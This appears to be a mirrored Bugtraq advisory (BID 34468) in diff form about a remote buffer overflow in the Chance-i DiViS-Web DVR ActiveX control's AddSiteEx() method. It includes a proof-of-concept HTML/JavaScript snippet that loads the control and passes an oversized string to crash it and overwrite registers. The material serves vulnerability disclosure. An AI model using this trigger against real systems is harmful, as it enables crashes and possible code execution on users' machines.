@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid34468<p><b><span style="font-size: 18pt;">Chance-i DiViS-Web DVR System ActiveX Control 'AddSiteEx()'  Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/34468/info">info</a><br><a href="http://www.securityfocus.com/bid/34468/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/34468/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/34468/solution">solution</a><br><a href="http://www.securityfocus.com/bid/34468/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				34468
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Apr 10 2009 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Apr 13 2009 07:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Digital Security Research Group
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Chance-i DiViS-Web DVR System  3.0.0.7<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept is available:<br/><br/>&amp;lt;OBJECT ID="DVR" classid="clsid:66F7F252-3FE1-4650-B1E5-94B2A38271C5" STYLE="width: 0px;"&amp;gt;<br/>&amp;lt;PARAM NAME="_Version" VALUE="65536"&amp;gt;<br/>&amp;lt;PARAM NAME="_ExtentX" VALUE="18203"&amp;gt;<br/>&amp;lt;PARAM NAME="_ExtentY" VALUE="13705"&amp;gt;<br/>&amp;lt;PARAM NAME="_StockProps" VALUE="0"&amp;gt;<br/>&amp;lt;PARAM NAME="Split" VALUE="4"&amp;gt;<br/>&amp;lt;/OBJECT&amp;gt;<br/><br/>//server address<br/>var g_sAddress = location.hostname;<br/>var g_sId = "";<br/>var g_sPwd = "";<br/>var g_bLogin = false;<br/>var g_nMaxCamera = 16;<br/><br/>// Port setting<br/>var g_nImage = 3000;<br/>var g_nControl = 3001;<br/>var g_nSound = 8800;<br/><br/>var long_buff = "alexsint";<br/><br/>while(long_buff.length&amp;lt;(550*8)) long_buff = long_buff + "alexsint"; //rewrite registers<br/><br/>DVR.Channels = 1;<br/><br/>DVR.AddSiteEx("", "", long_buff, "", 0, g_nImage, g_nControl, g_nSound); //Crash on Free() at ntdll
+	
+		<ul>
+</ul>
+</div>
